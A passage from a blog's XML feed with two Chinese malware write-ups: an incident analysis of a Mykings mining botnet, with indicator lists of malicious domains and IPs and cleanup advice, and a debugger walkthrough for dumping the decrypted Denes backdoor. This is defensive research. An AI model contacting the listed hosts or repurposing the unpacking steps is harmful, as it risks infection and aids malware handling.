src="/img/Mykings%E6%8C%96%E7%9F%BF/clip_image018.jpg"></p><p>除此之外还使用wmic下载<a href="http://ruisgood.ru域名下的相关文件./">http://ruisgood.ru域名下的相关文件。</a></p><p><img src="/img/Mykings%E6%8C%96%E7%9F%BF/clip_image019.png"></p><p>通过这一部分内容信息关联到一些其他的下载信息，如截图所示。</p><p><img src="/img/Mykings%E6%8C%96%E7%9F%BF/clip_image021.jpg"></p><p>最后的excludes，查看内容后发现应该是一个挖矿的配置信息，内容如下图所示。</p><p><img src="/img/Mykings%E6%8C%96%E7%9F%BF/clip_image023.jpg"></p><p>​    此次以上的信息，都是通过一张图片得来，果然搜索引擎的强大不是人脑力所能够比拟的，同时也需要做应急的人员拥有足够敏锐的观察力，要是我以前估计啥都没有。好歹也出来混了一段时间，还是要有点观察力的。(啊哈哈哈，感觉自己逐渐的开始流批了，低调，我要低调。咳咳咳)</p><p>​    到这里基本上就是客户第一天为我提供的全部信息。(tmd，就一张图，而且把客户由于不知道中了啥玩意，被通告修改，不给上外网，居然想着用手机开热点，最后卡成PPT。)</p><h2 id="30日样本分析和信息整理"><a href="#30日样本分析和信息整理" class="headerlink" title="30日样本分析和信息整理"></a>30日样本分析和信息整理</h2><p>心想着要是今天不给信息，我就搞Denes的后续提取分析了，没想到刚开工一会，就送来一些可能相关的样本，没办法了，样本都送过来了还是瞅瞅吧。</p><p>首先有个info和Temp目录，还有一个system目录，一个一个慢慢看。</p><p>Info目录下有个msief.exe，和之前发现的ups.dat一样是一个自启动的压缩文件，不过相比之前的c3.bat，这个版本的c3.bat不太那么一样。</p><p><img src="/img/Mykings%E6%8C%96%E7%9F%BF/clip_image025.jpg"></p><p><img src="/img/Mykings%E6%8C%96%E7%9F%BF/clip_image027.jpg"></p><p>这些涉及到的域名不是失效就是文件或目录不存在。</p><p><img src="/img/Mykings%E6%8C%96%E7%9F%BF/clip_image028.png"></p><p>紧接着继续看Temp目录下的文件情况。</p><p><img src="/img/Mykings%E6%8C%96%E7%9F%BF/clip_image030.jpg"></p><p>conhosta.exe也是用于释放c3a.bat的，同样的还是看看bat的内容。内容上大同小异，还是有些地方不太一样。</p><p><img src="/img/Mykings%E6%8C%96%E7%9F%BF/clip_image032.jpg"></p><p>将特殊域名本地化，将内容写入到C:\Windows\System32\drivers\etc\hosts文件中，进行本地解析。</p><p><img src="/img/Mykings%E6%8C%96%E7%9F%BF/clip_image033.png"></p><p><img src="/img/Mykings%E6%8C%96%E7%9F%BF/clip_image035.jpg"><img src="/img/Mykings%E6%8C%96%E7%9F%BF/clip_image036.png"></p><p>终于通过c3a.bat里面的power.txt找到一个可用的download.txt，并最终下回来了所有在download中列出来的文件。</p><p><img src="/img/Mykings%E6%8C%96%E7%9F%BF/clip_image038.jpg"></p><p><img src="/img/Mykings%E6%8C%96%E7%9F%BF/clip_image040.jpg"></p><p><img src="/img/Mykings%E6%8C%96%E7%9F%BF/clip_image042.jpg"></p><p>其中的u.exe 主要功能用于设置DNS，设置的值为223.5.5.5和8.8.8.8。</p><p><img src="/img/Mykings%E6%8C%96%E7%9F%BF/clip_image043.png"></p><p>conhost.exe 通过查询到的资料表明，该程序可能是利用了pcshare的源码修改后的程序，主要功能是循环请求C2服务执行更新自身、执行命令、下载“挖矿”软件等。如果第一次运行，会释放一个xpdown.dat文件，位于C:\Program Files\Common Files目录下。</p><p>xpdown.dat的内容是一组ip和域名的集合。</p><p><img src="/img/Mykings%E6%8C%96%E7%9F%BF/clip_image044.png"></p><p>​    剩下的几个文件在后面的分析中会提及，这里先不做说明。</p><p>最后看下system目录下的文件，开始的时候只有csrs.exe一个程序，经过多方面的处理之后提取出相关的资料。</p><p><img src="/img/Mykings%E6%8C%96%E7%9F%BF/clip_image046.jpg"></p><p>csrs.exe，运行后发现有很多跟python相关的文件，怀疑是python打包的exe。使用工具提取一看，还真是python的。(这里做一个额外的说明，大多数python打包的文件，在执行的时候都会释放一些python相关的文件，可以作为是否是python打包的一个点)</p><p><img src="/img/Mykings%E6%8C%96%E7%9F%BF/clip_image047.png"></p><p>通过相关资料和技术手段，修复pyc头部，并最终反编译得到了原始的py文件，是一个明显利用了ms17010的后门程序。</p><p><img src="/img/Mykings%E6%8C%96%E7%9F%BF/clip_image049.jpg"></p><p>通过https://.vim-cn.com/ef/5ab12fdf434f480022a89524ef1f6f97f92786.xml的内容继续寻找，还是找到了一些相关联的东西。</p><p><img src="/img/Mykings%E6%8C%96%E7%9F%BF/clip_image051.jpg"></p><p>其中ups.rar为之前提及的u.exe，主要用于设置dns，2.rar和之前的conhosta.exe是同一个文件。所以之前分析的关于conhosta.exe的释放内容完全适用于2.rar。</p><p>最后的max.rar具体信息不详，本身被vmp加壳保护。</p><p><img src="/img/Mykings%E6%8C%96%E7%9F%BF/clip_image052.png"></p><p>详细信息中提及可能是易语言程序，经过一些资料收集和信息比对后发现，这应该是Mykings中的bootkit程序，用于感染mbr。</p><p><img src="/img/Mykings%E6%8C%96%E7%9F%BF/clip_image054.jpg"></p><p>执行后释放了01.dat和02.dat两个文件，并删除了该文件。</p><p><img src="/img/Mykings%E6%8C%96%E7%9F%BF/clip_image056.jpg"></p><p>在01.dat中发现了一些和反病毒程序相关的信息。</p><p><img src="/img/Mykings%E6%8C%96%E7%9F%BF/clip_image058.jpg"></p><p>通过google搜索js.1226bye.xyz:280，发现很多关于该域名信息，但是最有效的信息还是关于MyKings挖矿。</p><p><img src="/img/Mykings%E6%8C%96%E7%9F%BF/clip_image060.jpg"></p><p>来看一看详细的对比情况，首先是max.exe的sha1的值如图所示。</p><p><img src="/img/Mykings%E6%8C%96%E7%9F%BF/clip_image061.png"></p><p>分析报告中的sha1的值如下图所示。</p><p><img src="/img/Mykings%E6%8C%96%E7%9F%BF/clip_image063.jpg"></p><p>发现两者完全一致，通过报告提及的另一个SHA1 of 54df8f078ea7d43b25daea54e4f0a30da530289e</p><p><img src="/img/Mykings%E6%8C%96%E7%9F%BF/clip_image064.png"></p><p>下载回来的max.exe的属性情况与报告中提及的一致，通过报告的描述，发现这个就是bootkit的安装程序了，包括释放的01.dat和02.dat</p><p><img src="/img/Mykings%E6%8C%96%E7%9F%BF/clip_image066.jpg"></p><p><img src="/img/Mykings%E6%8C%96%E7%9F%BF/clip_image068.jpg"></p><p>这些信息就是暗藏在01.dat中，通过寻找终于是发现了这两个网址的信息。</p><p><img src="/img/Mykings%E6%8C%96%E7%9F%BF/clip_image070.jpg"></p><p>同时还有一个TestMsg.tmp和TestMsg64.tmp，用于下载新的文件。由于这里分析的时候没有开启网络连接，所以并没有下载到TestMsg.tmp和TestMsg64.tmp，下图的信息为Mykings中涉及的TestMsg.tmp和TestMsg64.tmp。</p><p><img src="/img/Mykings%E6%8C%96%E7%9F%BF/clip_image071.png"></p><p>接下来报告分析了c3.bat文件，有关于SQL的强制攻击情况，也符合给我们讲述有SQL攻击的情况。</p><p><img src="/img/Mykings%E6%8C%96%E7%9F%BF/clip_image072.png"></p><p>通过报告的名称，加上之前在一个download.txt中发现的下载文件，尝试使用ok.exe和upsupx.exe居然真的下回来了文件。</p><p><img src="/img/Mykings%E6%8C%96%E7%9F%BF/clip_image074.jpg"></p><p>有意思的是，下载的upsupx.exe居然可以在本次攻击事件中，通过download.txt提及的ip下载回来，和之前分析的文件做对比，并比对sha1发现，upsupx.exe就是conhost.exe，是利用pcshare改版后的后门文件，从ok.exe的图标不难发现和之前的max.exe图标一致，且两者sha1值一样，说明这就是同一个文件，也就是用于bootkit的攻击程序。</p><p>报告最后提及了csrs的来源，不过可惜的是，这不适合与这次分析的csrs，从这下载连接中可以发现，csrs不过是被下载回来的一个执行文件，因此还需要找到csrs的来源，才能搞清楚整个事件的来龙去脉，不过可惜了，客户那边没有在提供其他的有效信息了。</p><p><img src="/img/Mykings%E6%8C%96%E7%9F%BF/clip_image076.jpg"></p><p>本次事件中并未发现相关EternalBlue spreader的传播模块。</p><p><img src="/img/Mykings%E6%8C%96%E7%9F%BF/clip_image077.png"></p><p>最后再来提一下之前没有说明的两个文件，其中1201.rar是xmrig的挖矿程序，修改文件后缀名，查看属性即可看出该文件的作用，并且修改后缀名后出现了xmrig的图标，因此这就是用来挖矿的程序了。</p><p><img src="/img/Mykings%E6%8C%96%E7%9F%BF/clip_image078.png"></p><p>20200510.rar改名为item.dat，同样加壳保护，行为分析时进程直接退出，具体功能暂时不详。(所以说啊，搞样本分析的，尼玛啥都得会点，这不又来个Armadillo的壳，前面还有个VMP的壳，之前是没精力搞下去了，若是之后有机会搞脱壳，还能再继续看看)</p><p><img src="/img/Mykings%E6%8C%96%E7%9F%BF/clip_image079.png"></p><p>到此，此次事件的溯源，基本上就到此为止了，更多的写出了我在整个溯源过程中的思路，并一步一步记录了如何去通过相关信息关联到更多的有用信息，详细的Mykings分析报告可参考如下连接。</p><p><a href="https://www.sophos.com/en-us/medialibrary/PDFs/technical-papers/sophoslabs-uncut-mykings-report.pdf">https://www.sophos.com/en-us/medialibrary/PDFs/technical-papers/sophoslabs-uncut-mykings-report.pdf</a></p><h2 id="IOC整理"><a href="#IOC整理" class="headerlink" title="IOC整理"></a>IOC整理</h2><p>整个事件中涉及了一个ftp服务器，ip：185.26.112.217，相关信息如下图所示。</p><p><img src="/img/Mykings%E6%8C%96%E7%9F%BF/clip_image081.jpg"></p><p><img src="/img/Mykings%E6%8C%96%E7%9F%BF/clip_image083.jpg"></p><p>hxxp://js.1226bye.xyz，最早涉及Mykings的域名信息。</p><p><img src="/img/Mykings%E6%8C%96%E7%9F%BF/clip_image085.jpg"></p><p>hxxp://ruisgood.ru，此次事件用于设置后门的域名，经关联发现同样是Myking。</p><p><img src="/img/Mykings%E6%8C%96%E7%9F%BF/clip_image087.jpg"></p><p>hxxp://wmi.1217bye.host,关联后发现同样是Myking。</p><p><img src="/img/Mykings%E6%8C%96%E7%9F%BF/clip_image089.jpg"></p><p>hxxp://js.ftp1202.site，没有任何标签，也没有对应的ip信息，可能为远控。</p><p><img src="/img/Mykings%E6%8C%96%E7%9F%BF/clip_image091.jpg"></p><p>hxxps://.vim-cn.com，被标记为正常域名，但是被用于来设置后门，估计该网站可能被攻陷。</p><p><img src="/img/Mykings%E6%8C%96%E7%9F%BF/clip_image093.jpg"></p><p>hxxp://wmi.1103bye.xyz，同样被标记为远控，可能是个远控的域名。</p><p><img src="/img/Mykings%E6%8C%96%E7%9F%BF/clip_image095.jpg"></p><p>173.208.139.170</p><p>173.208.153.130</p><p>172.83.155.170</p><p>144.208.127.215</p><p>103.106.250.161</p><p>103.106.250.162</p><p>192.236.160.237</p><p>173.247.239.186</p><p>199.168.100.74</p><p>167.88.180.175</p><p>223.25.247.152</p><p>本来在IOC整理完成后，整个溯源就应该结束了，但是毕竟是搞应急，还得给客户一份清理建议和安全建议。</p><h2 id="清理建议"><a href="#清理建议" class="headerlink" title="清理建议"></a>清理建议</h2><p>通过c3.bat也可以发现，整个Mykings的东西是比较混乱且命名不统一的，所以清除工作相对也只有采用手动清除的方式来完成。</p><ol><li><p>如果有cpu占用过高或者服务器卡顿的情况，查看进程信息，关闭可疑的高cpu占用进程lsma12.exe。</p></li><li><p>使用autoruns，删除启动项start，删除计划任务 Mysa、Mysa1、Mysa2、Mysa3、ok等删除WMI fuckyoumm*等</p></li><li><p>在以下目录中寻找是否存在get.exe g.exe 1201.rar 20200510.rar conhost.exe conhosta.exe item.dat max.exe ok.exe u.exe upsupx.exe winnts.exe lsma12.exe ,可以借助everything工具帮助寻找。</p></li><li><p>C:\Windows\system C:/Windows/debug C:/Windows/Temp C:\Windows\inf等目录，查看是否存在可疑文件。</p></li><li><p>由于存在bootkit程序，可能需要对mbr进行重建和修复操作。相关工具可以参考如下链接。</p></li></ol><p><a href="http://dlied6.qq.com/invc/xfspeed/qqpcmgr/other/SystemAidBoxPro.zip">http://dlied6.qq.com/invc/xfspeed/qqpcmgr/other/SystemAidBoxPro.zip</a></p><h2 id="安全建议"><a href="#安全建议" class="headerlink" title="安全建议"></a>安全建议</h2><p>从反编译提取出来的py文件来看，此次攻击借助了ms17010，也就是永恒之蓝漏洞发起攻击。建议从以下几点去修复。</p><ol><li><p>安装相关补丁文件，提高系统安全性。</p></li><li><p>如果不能安装补丁，建议关闭不必要的端口，尤其是139、445、1433，如果是云主机的话可以设置一下安全组规则。</p></li><li><p>检查系统弱口令，删除主机的异常账号。</p></li><li><p>不要使用弱密码，比如SqlServer、rdp等常用服务，禁用SqlServer的sa账号。</p></li></ol><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>通过一张图片，引发的事件溯源，看起来似乎很简单，但其实其中包含了很多的信息，比如需要分析者有敏感的观察力，还要有基本的寻找相关信息的能力，例如搜索引擎的使用，再者就是要有一颗勇于追求源头的心，无心做事，再多的线索都没有任何的成效。正是因为有一颗找寻源头的心，才有了本文和之后的Denes后门后续挖掘的文章(该文章还在整理中，应该会在近期发布)，感谢大家的阅读，有啥问题可以通过微信公众号(安全分析与研究)留言。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;原文章发布于看雪论坛和安全分析与研究公众号，现将文章整理进个人blog。&lt;/strong&gt;&lt;/p&gt;
&lt;h2 id=&quot;背景说明&quot;&gt;&lt;a href=&quot;#背景说明&quot; class=&quot;headerlink&quot; title=&quot;背景说明&quot;&gt;&lt;/a&gt;背景说明&lt;/h2&gt;&lt;p&gt;​</summary>
      
    
    
    
    <category term="样本相关" scheme="http://risks255.github.io/categories/%E6%A0%B7%E6%9C%AC%E7%9B%B8%E5%85%B3/"/>
    
    
    <category term="Mykings挖矿" scheme="http://risks255.github.io/tags/Mykings%E6%8C%96%E7%9F%BF/"/>
    
  </entry>
  
  <entry>
    <title>Denes后门分析</title>
    <link href="http://risks255.github.io/2020/07/03/Denes%E5%90%8E%E9%97%A8%E5%88%86%E6%9E%90/"/>
    <id>http://risks255.github.io/2020/07/03/Denes%E5%90%8E%E9%97%A8%E5%88%86%E6%9E%90/</id>
    <published>2020-07-03T01:55:00.000Z</published>
    <updated>2021-02-03T11:46:09.610Z</updated>
    
    <content type="html"><![CDATA[<p><strong>原文章发布于看雪论坛和安全分析与研究公众号，现将文章整理进个人blog。</strong></p><h2 id="事件背景"><a href="#事件背景" class="headerlink" title="事件背景"></a>事件背景</h2><p><img src="/img/Denes%E5%90%8E%E9%97%A8%E5%88%86%E6%9E%90/clip_image002.jpg"></p><p>前两天看了猫哥发布的最新的海莲花分析报告，于是乎跟着学习一波，遂有了本文之后要提及的故事了。</p><p><img src="/img/Denes%E5%90%8E%E9%97%A8%E5%88%86%E6%9E%90/clip_image004.jpg"></p><p>在文章的结尾，出现了一个名为Denes家族的后门样本，由于没有搞过，想着自己跟着猫哥的步骤搞一搞，结果一搞就一发不可收拾，遇到这种问题，各种坑，我是被坑哭了，不知道各位大佬可曾遇到过这样的问题。</p><p><img src="/img/Denes%E5%90%8E%E9%97%A8%E5%88%86%E6%9E%90/clip_image005.gif"></p><h2 id="开始分析"><a href="#开始分析" class="headerlink" title="开始分析"></a>开始分析</h2><p>来来来，开始我的分析过程，首先是跟着猫哥的文章，快速的找到Denes后门所在的内存区域，给它来个dump。</p><p>​这个记录已经是我分析完之后才发写的所以，我为了展现出我所踩过的坑，又踩了一遍给大家演示，我太难了。</p><p>​    第一次分析，使用的是OllyICE,不带strongod的插件，异常设置如下所示，可能有读者会问我为啥要设置，当然是因为调试的时候发现会触发某些异常导致调试的问题，才会去设置异常。</p><p><img src="/img/Denes%E5%90%8E%E9%97%A8%E5%88%86%E6%9E%90/clip_image006.png"></p><p>为了快速到达内存dump，我经过多次测试发现了一些好办法，首先是要等待恶意dll的加载，bp LoadLibraryW，让程序跑起来，看加载的位置。</p><p><img src="/img/Denes%E5%90%8E%E9%97%A8%E5%88%86%E6%9E%90/clip_image008.jpg"></p><p>这时，取消LoadLibraryW，下VirtualAlloc断点，来看加载的SoftwareUpdateFiles.locale内容所在的内存区域。</p><p><img src="/img/Denes%E5%90%8E%E9%97%A8%E5%88%86%E6%9E%90/clip_image009.png"></p><p>返回到用户层之后，发现了这段内存的地址，一般API返回地址通常在EAX中，内存窗口 等待写入过程。</p><p><img src="/img/Denes%E5%90%8E%E9%97%A8%E5%88%86%E6%9E%90/clip_image010.png"></p><p>紧接着就有一个ReadFileAPI调用，估摸着就是准备加载SoftwareUpdateFiles.locale的内容了。</p><p>​<img src="/img/Denes%E5%90%8E%E9%97%A8%E5%88%86%E6%9E%90/clip_image012.jpg"></p><p>此时内存中已经被写入了相关数据。</p><p><img src="/img/Denes%E5%90%8E%E9%97%A8%E5%88%86%E6%9E%90/clip_image014.jpg"></p><p>​    这里还需要另外一个API来完成数据的解密写写入过程，RtlMoveMemory，这个API也是在猫哥的分析文章中提到的，这里为了更快抵达战场，而进行的快速定位，bp RtlMoveMemory 之后，取消其他的断点，执行。</p><p><img src="/img/Denes%E5%90%8E%E9%97%A8%E5%88%86%E6%9E%90/clip_image015.png"></p><p>这里的地址就是Denes文件的一部分了，在数据窗口，翻到头就可以发现，看到了熟悉的Dos头部。</p><p><img src="/img/Denes%E5%90%8E%E9%97%A8%E5%88%86%E6%9E%90/clip_image017.jpg"></p><p>​    最后通过一串特征码定位，通过od的ctrl+s搜索命令序列来完成，记得勾选整个块，这串特征码是根据猫哥文章中提及的进入PE文件执行之前的最后一个调用call来确定的。</p><p><img src="/img/Denes%E5%90%8E%E9%97%A8%E5%88%86%E6%9E%90/clip_image018.png"></p><p>可以看到这里od给了我们找到的结果，在call eax加断点，取消之前所有的断点执行到这里来。</p><p><img src="/img/Denes%E5%90%8E%E9%97%A8%E5%88%86%E6%9E%90/clip_image019.png"></p><p>​    这时候整个Denes文件已经解码完成了，该收获成果了，从内存中dump出来看一看。本以为分析就此结束了，不曾想遇到个应急，没办法先放下了Denes的分析工作，先去把应急处理了。</p><p>处理完应急接着分析时，已经是第二天了。将dump文件一看，我开始有点懵了，啥情况难道昨天dump的文件不对劲？</p><p><img src="/img/Denes%E5%90%8E%E9%97%A8%E5%88%86%E6%9E%90/clip_image020.png"></p><p>​Entry Point为0？，难道没有入口点？估计要第二次分析了，ε=(´ο｀*)))唉，准备开始第二次分析吧。</p><p>​    第二次分析，因为之前的应急刚处理完，忘记了之前用的不是吾爱版的od，调试了之后发现程序莫名其妙的就崩溃了，我内心是崩溃的(之前调试不是好好的嘛，咋就崩溃了？)</p><p><img src="/img/Denes%E5%90%8E%E9%97%A8%E5%88%86%E6%9E%90/clip_image021.png"></p><p>​    这错误也是很奇怪，异常代码c0000005一般就是内存访问异常，但是给我的异常偏移为0？难道程序用到了0内存？一般情况下，访问0内存是会出现问题的，但是我记得昨天调试的时候，好像没有这个毛病啊？</p><p>​    就这样，第二次调试以失败告终，还特意在群里问了问各位大佬，依旧是没有得到什么有用的信息。没办法就这样开启了第三次调试。</p><p>​    第三次调试，不过这次用的x64dbg，此次调试很顺利，不过x64dbg有个比较麻烦的问题是API断下后，不像OD一样将参数集中在一起而是这样显示的。</p><p><img src="/img/Denes%E5%90%8E%E9%97%A8%E5%88%86%E6%9E%90/clip_image022.png"></p><p>成功的从内存中dump出来了Denes样本，但是还是有很多疑问，对比看雪的一篇文章 <a href="https://bbs.pediy.com/thread-259596.htm%E3%80%82">https://bbs.pediy.com/thread-259596.htm。</a></p><p><img src="/img/Denes%E5%90%8E%E9%97%A8%E5%88%86%E6%9E%90/clip_image024.jpg"></p><p>我发现个问题，为啥这个Denes资源不可见呢？这种问题几乎没遇到过，通过搜索引擎也得不到什么有效信息。</p><p><img src="/img/Denes%E5%90%8E%E9%97%A8%E5%88%86%E6%9E%90/clip_image026.jpg"></p><p>想着要不就这么放弃了吧，反正也不差这么一点，但是之后自己做的和心里想的就表里不一了，继续从刚才的文章中寻找相关的信息。果然想的什么都是扯淡，动手搞一搞比啥都强，最后还是本着一颗追求到底的心，又开始第四次的调试过程。</p><p>​第四次调试，还是用回了之前的OllyICE继续调试，跳过之前定位到Denes的过程，来到最后的call eax这里。由于要加载资源函数所有就下了相关的API断点，FindResource将A系列和W系列都打上断点，还有LoadResource断点，运行看是个什么情况。</p><p><img src="/img/Denes%E5%90%8E%E9%97%A8%E5%88%86%E6%9E%90/clip_image027.png"></p><p>​    嗯？什么东西，这个hModule这个地址咋这么熟悉呢？数据窗口一跟随，卧槽咧，这不就是Denes嘛，果然在资源上做了一些手段，导致资源编辑工具无法直接查看，但是程序功能成功的定位，就表示内容还是存在的。</p><p><img src="/img/Denes%E5%90%8E%E9%97%A8%E5%88%86%E6%9E%90/clip_image029.jpg"></p><p>通过查询API发现，LoadResource返回的地址，就是资源所在的内存地址。</p><p><img src="/img/Denes%E5%90%8E%E9%97%A8%E5%88%86%E6%9E%90/clip_image030.png"></p><p>果不其然，在内存中找到了这段资源文件。</p><p><img src="/img/Denes%E5%90%8E%E9%97%A8%E5%88%86%E6%9E%90/clip_image032.jpg"></p><p>​    将整个资源文件从内存中dump出来放着，以防像之前一样重头再来，然后我就像个傻逼一样的盯着这段资源端，一直知道程序跑起来都没看到解码的过程，心想着啥情况，不是说会进行解密嘛，我咋没看到这数据有啥变化呢？？？</p><p><img src="/img/Denes%E5%90%8E%E9%97%A8%E5%88%86%E6%9E%90/clip_image033.gif"></p><p>不过在这个过程中我发现出现了域名的解析，但是没有转向内存，因为一心傻逼的盯着了资源数据的变化。程序已经跑飞了，只有第五次调试了。</p><p>​    第五次调试，在弄好之前的种种问题之后，缓慢仔细的调试着这段花指令代码，找到之前出现域名解析的call调用，应该就可以找到整段解密的过程了。现在的问题就是如何确定第二段代码需要的内存从哪里来？</p><p>再一次调试来到了call eax这里，查看内存的情况，可以看到目前第二段内存并没有出现。</p><p><img src="/img/Denes%E5%90%8E%E9%97%A8%E5%88%86%E6%9E%90/clip_image034.png"> </p><p>​现在步过call eax，其中触发了一次HeapCreate分配，不过大小只有1024，分配好的地址如下图所示。</p><p><img src="/img/Denes%E5%90%8E%E9%97%A8%E5%88%86%E6%9E%90/clip_image035.png"></p><p><img src="/img/Denes%E5%90%8E%E9%97%A8%E5%88%86%E6%9E%90/clip_image037.jpg"></p><p>​    难道真的是用的HeapCreate来创建，并扩充了这个heap的大小？为什么这么说，来看一下内存的布局情况，已经无限接近于之前出现的第二段内存的情况了。 </p><p>当从call eax返回之时，可以发现内存之前的1000大小变成了3000。</p><p><img src="/img/Denes%E5%90%8E%E9%97%A8%E5%88%86%E6%9E%90/clip_image038.png"></p><p>​    正当我以为这就是第二段内存是，VirtualAlloc的出现让我觉得，heap应该不是第二段的内存了，这时候再来看看内存布局的情况。</p><p><img src="/img/Denes%E5%90%8E%E9%97%A8%E5%88%86%E6%9E%90/clip_image039.png"></p><p>这时查看内存时发现，到头来一场空，代码似乎已经解码完毕了。</p><p><img src="/img/Denes%E5%90%8E%E9%97%A8%E5%88%86%E6%9E%90/clip_image041.jpg"></p><p>不要以为我真的只是调试了5次，只是省略了很多很多重复的步骤，从刚才的测试中也知道了解密过程是在call eax中完成的，所以必须要跟进call eax进一步查看具体是什么回事。</p><p>​    第六次调试，也是我最后一次调试了，大多数已经弄明白了，就是最后的解密过程和内存分配问题了，已经找到了复制已解密的函数代码，但是依旧没有找到分配内存的API。</p><p><img src="/img/Denes%E5%90%8E%E9%97%A8%E5%88%86%E6%9E%90/clip_image042.png"></p><p>第一轮赋值后的代码情况如下图所示。</p><p><img src="/img/Denes%E5%90%8E%E9%97%A8%E5%88%86%E6%9E%90/clip_image044.jpg"></p><p>第二次复制后的代码情况如下图所示。</p><p><img src="/img/Denes%E5%90%8E%E9%97%A8%E5%88%86%E6%9E%90/clip_image046.jpg"></p><p>​自此整个解密的内存就找到了，只需要来一个dump即可拿出其中被解密出来的两个内置的dll文件了。</p><h2 id="特征码"><a href="#特征码" class="headerlink" title="特征码"></a>特征码</h2><p>push ebx</p><p>push 1</p><p>push esi</p><p>add eax,esi</p><p>call eax</p><p>这一段特征码的作用是定位到解密完成的Denes的位置，通过eax的值，可以找到Denes的Dos位置。</p><p>and edi,0fh</p><p>and esi,0fh</p><p>cmp edi,esi</p><p>pop esi</p><p>pop edi</p><p>这一段可太不容易了，而且有多个函数都有调用这一段，这时复制已解密数据的的关键点，通过命令找到该段代码的头部，调试即可发现整个复制过程。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>​    到此整个踩坑过程就全部结束了，整个的分析过程中，遇到了确实很多的问题，但是凭着耐心一步一步，解决了很多的问题，但是还是留下了两个问题。这段用于存放解密数据的内存区域从何而来的疑问，目前已经没有更多的精力继续搞下去了，对此感觉已经是尽力了，解密过程的代码在哪儿？应该和这段内存区域有着一定的关系，有知道该段内存区域如何来的小伙伴可以在公众号下方留言告知。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;原文章发布于看雪论坛和安全分析与研究公众号，现将文章整理进个人blog。&lt;/strong&gt;&lt;/p&gt;
&lt;h2 id=&quot;事件背景&quot;&gt;&lt;a href=&quot;#事件背景&quot; class=&quot;headerlink&quot; title=&quot;事件背景&quot;&gt;&lt;/a&gt;事件背景&lt;/h2&gt;&lt;p&gt;&lt;</summary>
      
    
    
    
    <category term="APT相关" scheme="http://risks255.github.io/categories/APT%E7%9B%B8%E5%85%B3/"/>
    
    
    <category term="APT" scheme="http://risks255.github.io/tags/APT/"/>
    
    <category term="Denes后门" scheme="http://risks255.github.io/tags/Denes%E5%90%8E%E9%97%A8/"/>
    
  </entry>
  
</feed>
